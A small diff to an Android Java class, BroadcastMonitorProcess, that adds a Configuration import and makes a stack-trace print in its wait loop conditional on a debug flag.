@@ -14,6 +14,7 @@ import java.util.ArrayList;
 import android.app.ActivityManager.RunningAppProcessInfo;
 
 import com.android.service.RunningProcesses;
+import com.android.service.conf.Configuration;
 
 public class BroadcastMonitorProcess extends Thread {
 	/** The Constant TAG. */
@@ -43,7 +44,7 @@ public class BroadcastMonitorProcess extends Thread {
 			try {
 				wait(period);
 			} catch (InterruptedException e) {
-				e.printStackTrace();
+				if(Configuration.DEBUG) { e.printStackTrace(); }
 			}
 		} while (true);
 	}
